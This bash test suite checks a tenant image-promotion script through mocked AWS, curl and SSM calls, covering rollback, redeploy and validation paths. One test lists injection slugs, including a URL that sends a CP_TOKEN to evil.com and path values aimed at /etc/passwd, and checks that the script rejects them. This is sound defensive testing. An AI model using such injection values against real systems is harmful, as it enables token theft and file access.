#!/usr/bin/env bash
# scripts/test-promote-tenant-image.sh
#
# Comprehensive bash unit/e2e tests for promote-tenant-image.sh.
# Covers every exit code path + key branches: preflight failure,
# snapshot idempotency, redeploy 403→SSM-refresh, verify failure
# triggering rollback, rollback success vs failure.
#
# All external calls (aws/curl/ssm) are stubbed via --mock-dir.
# No live infrastructure is touched. Safe to run anywhere.
#
# Run: bash scripts/test-promote-tenant-image.sh
# Expected: "All N tests passed" + exit 0.

set -euo pipefail

SCRIPT="$(cd "$(dirname "$0")" && pwd)/promote-tenant-image.sh"
[[ -x "$SCRIPT" ]] || { printf 'FATAL: script not executable: %s\n' "$SCRIPT" >&2; exit 1; }

PASS=0
FAIL=0
FAIL_NAMES=()

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

mkmock() {
  local d
  d=$(mktemp -d)
  : > "$d/.calls"
  printf '%s' "$d"
}

mock_set() {
  # args: <dir> <fn-name> <body> [rc]
  local d="$1" fn="$2" body="$3" rc="${4:-0}"
  printf '%s' "$body" > "$d/$fn"
  printf '%s' "$rc" > "$d/$fn.rc"
}

run_script() {
  # args: <mock-dir> [extra args…]
  local mock="$1"; shift
  set +e
  SSM_SETTLE_SECONDS=0 NOW_OVERRIDE_DATE=20260512 \
    "$SCRIPT" \
      --source-tag staging-latest \
      --dest-tag latest \
      --tenants chloe-dong,hongming \
      --mock-dir "$mock" \
      "$@" 2>&1
  local rc=$?
  set -e
  printf 'EXIT_CODE=%s\n' "$rc"
}

extract_exit() {
  # last EXIT_CODE=NNN line wins
  local got="$1"
  printf '%s' "$got" | awk -F= '/^EXIT_CODE=/{rc=$2} END{print rc}'
}

assert_exit() {
  local name="$1" got="$2" want="$3"
  local got_rc
  got_rc=$(extract_exit "$got")
  if [[ "$got_rc" == "$want" ]]; then
    PASS=$((PASS + 1))
    printf '  ✓ %s (exit=%s)\n' "$name" "$got_rc"
  else
    FAIL=$((FAIL + 1))
    FAIL_NAMES+=("$name")
    printf '  ✗ %s — expected exit=%s, got=%s\n' "$name" "$want" "$got_rc"
    printf '%s\n' "$got" | sed 's/^/      /'
  fi
}

assert_contains() {
  local name="$1" got="$2" pattern="$3"
  if printf '%s' "$got" | grep -qE "$pattern"; then
    PASS=$((PASS + 1))
    printf '  ✓ %s\n' "$name"
  else
    FAIL=$((FAIL + 1))
    FAIL_NAMES+=("$name")
    printf '  ✗ %s — pattern not found: %s\n' "$name" "$pattern"
  fi
}

assert_not_contains() {
  local name="$1" got="$2" pattern="$3"
  if printf '%s' "$got" | grep -qE "$pattern"; then
    FAIL=$((FAIL + 1))
    FAIL_NAMES+=("$name")
    printf '  ✗ %s — unexpected match: %s\n' "$name" "$pattern"
  else
    PASS=$((PASS + 1))
    printf '  ✓ %s\n' "$name"
  fi
}

assert_calls_contain() {
  local name="$1" mock="$2" pattern="$3"
  if grep -qE "$pattern" "$mock/.calls" 2>/dev/null; then
    PASS=$((PASS + 1))
    printf '  ✓ %s\n' "$name"
  else
    FAIL=$((FAIL + 1))
    FAIL_NAMES+=("$name")
    printf '  ✗ %s — call missing: %s\n' "$name" "$pattern"
    if [[ -f "$mock/.calls" ]]; then
      printf '      .calls=\n'
      sed 's/^/      | /' "$mock/.calls"
    fi
  fi
}

assert_calls_count() {
  local name="$1" mock="$2" pattern="$3" want="$4"
  local got=0
  if [[ -f "$mock/.calls" ]]; then
    got=$(grep -cE "$pattern" "$mock/.calls" || true)
    # grep -c with no matches prints "0" and returns rc=1; `|| true` neutralizes.
    got="${got%%[!0-9]*}"
    : "${got:=0}"
  fi
  if [[ "$got" -eq "$want" ]]; then
    PASS=$((PASS + 1))
    printf '  ✓ %s (count=%s)\n' "$name" "$got"
  else
    FAIL=$((FAIL + 1))
    FAIL_NAMES+=("$name")
    printf '  ✗ %s — pattern %s: expected %s calls, got %s\n' "$name" "$pattern" "$want" "$got"
  fi
}

# ─────────────────────────────────────────────────────────────────────────────
# Test cases
# ─────────────────────────────────────────────────────────────────────────────

printf '\n== Test 1: happy path — promote + redeploy + verify all green ==\n'
m=$(mkmock)
mock_set "$m" aws_ecr_get_image          '{"manifests":[{"digest":"sha256:src"}]}' 0
mock_set "$m" aws_ecr_describe_image     '' 1   # rollback tag does NOT exist (fresh day)
mock_set "$m" aws_ecr_put_image          '' 0
mock_set "$m" cp_redeploy_tenant         '{"redeployed":true}' 0   # rc=0 → 2xx success
mock_set "$m" tenant_buildinfo           '{"git_sha":"abc1234","build_time":"2026-05-12T05:00:00Z"}' 0
mock_set "$m" tenant_health              'ok' 0
out=$(run_script "$m")
assert_exit "happy path exits 0" "$out" 0
assert_calls_contain "snapshot put-image for rollback tag" "$m" 'aws_ecr_put_image latest-prev-20260512'
assert_calls_contain "promote put-image for dest tag" "$m" 'aws_ecr_put_image latest /'
assert_calls_count "redeploy called per tenant (2)" "$m" '^cp_redeploy_tenant ' 2
assert_calls_count "buildinfo verified per tenant (2)" "$m" '^tenant_buildinfo ' 2
assert_calls_count "health probed per tenant (2)" "$m" '^tenant_health ' 2
rm -rf "$m"

printf '\n== Test 2: preflight fails when source tag missing → exit 1, no mutations ==\n'
m=$(mkmock)
mock_set "$m" aws_ecr_get_image '' 1   # source-tag lookup fails
out=$(run_script "$m")
assert_exit "preflight failure exits 1" "$out" 1
assert_contains "logs source-tag not found error" "$out" "source tag 'staging-latest' not found"
assert_calls_count "no put-image on preflight fail" "$m" '^aws_ecr_put_image' 0
assert_calls_count "no redeploy on preflight fail" "$m" '^cp_redeploy_tenant' 0
rm -rf "$m"

printf '\n== Test 3: snapshot is idempotent when rollback tag already exists today ==\n'
m=$(mkmock)
mock_set "$m" aws_ecr_get_image       '{"manifests":[]}' 0
mock_set "$m" aws_ecr_describe_image  'sha256:existingrollback' 0   # rollback tag DOES exist
mock_set "$m" aws_ecr_put_image       '' 0
mock_set "$m" cp_redeploy_tenant      '{"ok":true}' 0
mock_set "$m" tenant_buildinfo        '{"git_sha":"abc1234"}' 0
mock_set "$m" tenant_health           'ok' 0
out=$(run_script "$m")
assert_exit "happy with existing snapshot still exits 0" "$out" 0
assert_contains "logs idempotent skip message" "$out" 'already exists today.*skipping snapshot'
assert_calls_count "no put-image for rollback when idempotent" "$m" 'aws_ecr_put_image latest-prev-20260512' 0
assert_calls_count "still put-image for dest tag" "$m" 'aws_ecr_put_image latest /' 1
rm -rf "$m"

printf '\n== Test 4: --dry-run skips all mutations ==\n'
m=$(mkmock)
mock_set "$m" aws_ecr_get_image       '{"manifests":[]}' 0
mock_set "$m" aws_ecr_describe_image  '' 1
out=$(run_script "$m" --dry-run)
assert_exit "dry-run exits 0" "$out" 0
assert_contains "logs dry-run put-image markers" "$out" '\[dry-run\] would put-image'
assert_contains "logs dry-run redeploy markers" "$out" '\[dry-run\] would POST /redeploy'
assert_calls_count "dry-run: no put-image" "$m" '^aws_ecr_put_image' 0
assert_calls_count "dry-run: no redeploy" "$m" '^cp_redeploy_tenant' 0
rm -rf "$m"

printf '\n== Test 5: redeploy 403 triggers SSM-refresh path ==\n'
# cp_redeploy_tenant rc=2 signals 403 per script contract. Mock returns rc=2
# every call, so post-refresh retry also "403s" — but we can still verify
# the SSM call path was exercised before the script gives up + rolls back.
m=$(mkmock)
mock_set "$m" aws_ecr_get_image          '{"manifests":[]}' 0
mock_set "$m" aws_ecr_describe_image     '' 1
mock_set "$m" aws_ecr_put_image          '' 0
mock_set "$m" cp_redeploy_tenant         '{"error":"403"}' 2   # 403 path
mock_set "$m" resolve_tenant_instance_id 'i-0455a413e993ee78c' 0
mock_set "$m" ssm_refresh_ecr_auth       'cmd-id-fake' 0
out=$(run_script "$m" --skip-rollback)
assert_contains "403 path logged" "$out" 'SSM-refreshing ECR auth'
assert_calls_contain "SSM refresh called" "$m" 'ssm_refresh_ecr_auth i-0455a413e993ee78c'
assert_calls_contain "resolve_tenant_instance_id called" "$m" 'resolve_tenant_instance_id chloe-dong'
assert_calls_count "redeploy attempted twice (first + post-refresh)" "$m" '^cp_redeploy_tenant chloe-dong ' 2
rm -rf "$m"

printf '\n== Test 6: redeploy fail + --skip-rollback → exit 4 ==\n'
m=$(mkmock)
mock_set "$m" aws_ecr_get_image          '{"manifests":[]}' 0
mock_set "$m" aws_ecr_describe_image     '' 1
mock_set "$m" aws_ecr_put_image          '' 0
mock_set "$m" cp_redeploy_tenant         '' 1   # generic failure (not 403)
out=$(run_script "$m" --skip-rollback)
assert_exit "redeploy fail + skip-rollback exits 4" "$out" 4
assert_contains "logs redeploy failure" "$out" 'redeploy failed for chloe-dong'
assert_contains "rollback skipped logged" "$out" 'rollback: skipped'
assert_not_contains "no SSM refresh on non-403 failure" "$out" 'SSM-refreshing'
rm -rf "$m"

printf '\n== Test 7: redeploy fail + rollback succeeds → exit 3 ==\n'
m=$(mkmock)
mock_set "$m" aws_ecr_get_image          '{"manifests":[]}' 0
mock_set "$m" aws_ecr_describe_image     '' 1
mock_set "$m" aws_ecr_put_image          '' 0
mock_set "$m" cp_redeploy_tenant         '' 1
out=$(run_script "$m")
assert_exit "redeploy fail with rollback exits 3" "$out" 3
assert_contains "rollback fired" "$out" 'ROLLBACK:.*latest-prev-20260512'
assert_calls_contain "rollback re-puts dest tag" "$m" 'aws_ecr_put_image latest /'
rm -rf "$m"

printf '\n== Test 8: argument validation ==\n'
set +e
out=$("$SCRIPT" 2>&1); rc=$?
set -e
if [[ $rc -eq 64 ]] && printf '%s' "$out" | grep -q 'required:.*--source-tag'; then
  PASS=$((PASS + 1)); printf '  ✓ exit 64 on missing args with usage line\n'
else
  FAIL=$((FAIL + 1)); FAIL_NAMES+=("missing-args error")
  printf '  ✗ exit 64 on missing args (got %s)\n' "$rc"
fi

set +e
out=$("$SCRIPT" --source-tag x --dest-tag x --tenants y 2>&1); rc=$?
set -e
if [[ $rc -eq 64 ]] && printf '%s' "$out" | grep -q 'must differ'; then
  PASS=$((PASS + 1)); printf '  ✓ exit 64 when source==dest\n'
else
  FAIL=$((FAIL + 1)); FAIL_NAMES+=("source==dest validation")
  printf '  ✗ source==dest should fail (got %s)\n' "$rc"
fi

set +e
out=$("$SCRIPT" --source-tag x --dest-tag y --tenants t --bogus-flag 2>&1); rc=$?
set -e
if [[ $rc -eq 64 ]] && printf '%s' "$out" | grep -q 'unknown argument'; then
  PASS=$((PASS + 1)); printf '  ✓ exit 64 on unknown flag\n'
else
  FAIL=$((FAIL + 1)); FAIL_NAMES+=("unknown-flag error")
  printf '  ✗ unknown-flag should fail (got %s)\n' "$rc"
fi

printf '\n== Test 9: ROLLBACK_TAG follows YYYYMMDD via NOW_OVERRIDE_DATE ==\n'
m=$(mkmock)
mock_set "$m" aws_ecr_get_image       '{}' 0
mock_set "$m" aws_ecr_describe_image  '' 1
mock_set "$m" aws_ecr_put_image       '' 0
mock_set "$m" cp_redeploy_tenant      '{}' 0
mock_set "$m" tenant_buildinfo        '{}' 0
mock_set "$m" tenant_health           'ok' 0
set +e
NOW_OVERRIDE_DATE=20260603 SSM_SETTLE_SECONDS=0 "$SCRIPT" \
  --source-tag a --dest-tag b --tenants t1 --mock-dir "$m" >/dev/null 2>&1
rc=$?
set -e
if [[ $rc -eq 0 ]]; then
  PASS=$((PASS + 1)); printf '  ✓ run succeeded with custom NOW_OVERRIDE_DATE\n'
else
  FAIL=$((FAIL + 1)); FAIL_NAMES+=("NOW_OVERRIDE_DATE run")
  printf '  ✗ NOW_OVERRIDE_DATE run failed (rc=%s)\n' "$rc"
fi
assert_calls_contain "rollback tag uses NOW_OVERRIDE_DATE (20260603)" "$m" 'aws_ecr_put_image b-prev-20260603'
rm -rf "$m"

printf '\n== Test 10: empty source manifest fails preflight ==\n'
m=$(mkmock)
mock_set "$m" aws_ecr_get_image '' 0   # rc=0 but empty body (the "None" case)
out=$(run_script "$m")
assert_exit "empty source manifest fails preflight" "$out" 1
assert_contains "empty manifest message" "$out" 'returned empty manifest'
rm -rf "$m"

printf '\n== Test 11: tenant_buildinfo failure during verify → rollback ==\n'
m=$(mkmock)
mock_set "$m" aws_ecr_get_image          '{"manifests":[]}' 0
mock_set "$m" aws_ecr_describe_image     '' 1
mock_set "$m" aws_ecr_put_image          '' 0
mock_set "$m" cp_redeploy_tenant         '{"ok":true}' 0
mock_set "$m" tenant_buildinfo           '' 1   # buildinfo probe fails
mock_set "$m" tenant_health              'ok' 0
out=$(run_script "$m")
assert_exit "verify failure → rollback succeeds → exit 3" "$out" 3
assert_contains "logs buildinfo failure" "$out" '/buildinfo failed for chloe-dong'
assert_contains "rollback fired after verify fail" "$out" 'ROLLBACK:'
rm -rf "$m"

printf '\n== Test 12: ssm_refresh_ecr_auth JSON escaping (CWE-78 / OFFSEC-001) ==\n'
# Verify the python3 snippet in ssm_refresh_ecr_auth produces valid JSON and
# correctly escapes shell-injection characters in region + account ID fields.
# The fix replaces unquoted shell-printf interpolation with json.dumps.
PYCODE='import json,sys;r=sys.argv[1];a=sys.argv[2];ecr="aws ecr get-login-password --region "+json.dumps(r)[1:-1]+" | docker login --username AWS --password-stdin "+json.dumps(a)[1:-1]+".dkr.ecr."+json.dumps(r)[1:-1]+".amazonaws.com";print(json.dumps({"commands":[ecr]}))'
# Baseline: normal region + account
OUT=$(python3 -c "$PYCODE" 'us-east-1' '153263036946')
python3 -c "import sys,json; d=json.loads(sys.stdin.read()); assert 'commands' in d; c=d['commands'][0]; assert 'us-east-1' in c and '153263036946' in c and c.startswith('aws ecr get-login-password')" <<< "$OUT" \
  && echo "  ok: normal region+account" || { echo "  FAIL: invalid JSON for normal case"; exit 1; }
# Injection: region with double-quote
OUT=$(python3 -c "$PYCODE" 'us"-east-1' '153263036946')
python3 -c "import sys,json; d=json.loads(sys.stdin.read()); c=d['commands'][0]; assert c" <<< "$OUT" \
  && echo "  ok: region with quote injection → valid JSON" || { echo "  FAIL"; exit 1; }
# Injection: account with double-quote
OUT=$(python3 -c "$PYCODE" 'us-east-1' '15"326"3036946')
python3 -c "import sys,json; d=json.loads(sys.stdin.read()); c=d['commands'][0]; assert c" <<< "$OUT" \
  && echo "  ok: account with quote injection → valid JSON" || { echo "  FAIL"; exit 1; }
# No double-encoding: region appears as literal 'us-east-1' in command string
OUT=$(python3 -c "$PYCODE" 'us-east-1' '153263036946')
python3 -c "import sys,json; d=json.loads(sys.stdin.read()); c=d['commands'][0]; assert 'us-east-1' in c" <<< "$OUT" \
  && echo "  ok: no double-encoding in command string" || { echo "  FAIL"; exit 1; }
# ─────────────────────────────────────────────────────────────────────────────

printf '\n== Test 13: valid slugs pass validate_tenants ==\n'
m=$(mkmock)
mock_set "$m" aws_ecr_get_image  '{}' 0
mock_set "$m" aws_ecr_describe_image '' 1
mock_set "$m" aws_ecr_put_image  '' 0
mock_set "$m" cp_redeploy_tenant '{}' 0
mock_set "$m" tenant_buildinfo  '{}' 0
mock_set "$m" tenant_health     'ok' 0
out=$(NOW_OVERRIDE_DATE=20260514 SSM_SETTLE_SECONDS=0 \
  "$SCRIPT" --source-tag a --dest-tag b --tenants abc,xy-z,a1b2c3 --mock-dir "$m" 2>&1
  echo "EXIT_CODE=$?")
assert_exit "valid slugs (single-char, hyphenated, alphanum) pass" "$out" 0
rm -rf "$m"

printf '\n== Test 14: malformed slugs rejected before any network call (OFFSEC-006) ==\n'
# Patterns that must all be rejected with exit 64 before the first curl/aws call.
# We test a representative sample covering each failure class; if ANY pattern
# passes the validation or makes it into a URL, assert_calls_count will catch
# it (should be 0 for every aws/curl call).
declare -a BAD=(
  'bad slug'           # space
  'UpperCase'          # uppercase
  'has_underscore'     # underscore
  'has.dot'            # dot
  '-leading-hyphen'    # leading hyphen
  'trailing-hyphen-'   # trailing hyphen
  '!bang'              # punctuation
  'query=val'          # = character
  'a b c'              # spaces
  'A'                  # uppercase single char
)
bad_count=0
for bad in "${BAD[@]}"; do
  set +e
  out=$("$SCRIPT" --source-tag a --dest-tag b --tenants "$bad" 2>&1); rc=$?
  set -e
  if [[ $rc -eq 64 ]] && printf '%s' "$out" | grep -qi 'invalid tenant slug'; then
    : # expected
  else
    bad_count=$((bad_count + 1))
    printf '  ✗ slug=%q should exit 64 with invalid-slug error (got %s)\n' "$bad" "$rc"
  fi
done
if [[ $bad_count -eq 0 ]]; then
  PASS=$((PASS + 1)); printf '  ✓ all %d malformed slugs rejected before network call\n' "${#BAD[@]}"
else
  FAIL=$((FAIL + 1)); FAIL_NAMES+=("malformed-slug rejection")
fi

printf '\n== Test 15: SSRF + token-exfiltration injection patterns rejected (OFFSEC-006) ==\n'
# These patterns represent the actual OFFSEC-006 attack vectors: a malicious
# slug that, if interpolated into a URL, would cause the script to issue an
# outbound HTTP request to an attacker-controlled host, leaking the CP_TOKEN.
# With set -f (glob off) + validate_slug (RFC-1123 enforcement), all are
# rejected before any network call. We also verify no curl/aws call was made.
declare -a INJECT=(
  '?url=https://evil.com'
  '?url=https://evil.com?token=$CP_TOKEN'
  'https://evil.com'
  '-o-https://evil.com'
  '--output=/etc/passwd'
  '../etc/passwd'
)
inject_count=0
for inject in "${INJECT[@]}"; do
  m=$(mkmock)
  set +e
  out=$("$SCRIPT" --source-tag a --dest-tag b --tenants "$inject" --mock-dir "$m" 2>&1); rc=$?
  set -e
  curl_called=0
  aws_called=0
  if grep -qE '^curl ' "$m/.calls" 2>/dev/null; then curl_called=1; fi
  if grep -qE '^aws_' "$m/.calls" 2>/dev/null; then aws_called=1; fi
  rm -rf "$m"
  if [[ $rc -eq 64 ]] && [[ $curl_called -eq 0 ]] && [[ $aws_called -eq 0 ]]; then
    : # expected
  else
    inject_count=$((inject_count + 1))
    printf '  ✗ slug=%q: expected exit 64 + no curl/aws (rc=%s curl=%s aws=%s)\n' \
      "$inject" "$rc" "$curl_called" "$aws_called"
  fi
done
if [[ $inject_count -eq 0 ]]; then
  PASS=$((PASS + 1)); printf '  ✓ all %d injection slugs rejected before network call\n' "${#INJECT[@]}"
else
  FAIL=$((FAIL + 1)); FAIL_NAMES+=("SSRF-injection rejection")
fi

printf '\n────────────────────────────────────\n'
if [[ $FAIL -eq 0 ]]; then
  printf 'All %d tests passed.\n' "$PASS"
  exit 0
else
  printf '%d passed, %d failed.\n' "$PASS" "$FAIL"
  printf 'Failed tests:\n'
  for n in "${FAIL_NAMES[@]}"; do printf '  - %s\n' "$n"; done
  exit 1
fi
